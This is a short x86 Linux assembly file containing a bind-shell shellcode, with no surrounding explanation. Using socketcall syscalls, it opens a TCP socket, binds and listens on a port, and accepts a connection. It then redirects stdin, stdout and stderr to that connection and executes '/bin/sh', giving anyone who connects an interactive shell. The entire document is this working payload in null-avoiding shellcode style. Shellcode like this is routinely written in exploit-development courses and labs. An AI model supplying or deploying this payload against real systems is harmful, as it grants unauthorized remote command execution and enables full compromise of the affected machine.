;
;
;
;
global _start

section .text

_start:
	xor	eax, eax
	xor	ebx, ebx
	xor	ecx, ecx
	xor	edx, edx

	;listenfd=socket(AF_INET, SOCK_STREAM, 0)
	mov	al, 0x66
	mov	bl, 0x1
	push	edx
	push	0x1
	push	0x2
	mov	ecx, esp
	int	0x80
	mov	ebp, eax

	;bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))
	mov	al, 0x66
	mov	bl, 0x2
	push	edx
	push	word 0x115c
	push	bx
	mov	ecx, esp
	push	0x10
	push	ecx
	push	ebp
	mov	ecx, esp
	int	0x80

	;listen(listenfd, 1)
	mov	al, 0x66
	mov	bl, 0x4
	push	0x1
	push	ebp
	mov	ecx, esp
	int	0x80

	;connfd=accept(listenfd, (struct sockaddr*)NULL, NULL)
	mov	al, 0x66
	mov	bl, 0x5
	push	edx
	push	edx
	push	ebp
	mov	ecx, esp
	int	0x80

	;dup2(connfd, 2); dup2(connfd, 1); dup2(connfd, 0);
	mov	ebx, eax
	xor	ecx, ecx
	mov	cl,0x3
dupfd:
	dec	cl
	mov	al, 0x3f
	int	0x80
	jne	dupfd

	;execve("/bin/sh", NULL, NULL)
	xor	eax, eax
	push	edx
	push	0x68732f6e
	push	0x69622f2f
	mov	ebx, esp
	push	edx
	push	ebx
	mov	ecx, esp
	push	edx
	mov	edx, esp
	mov	al, 0xb
	int	0x80
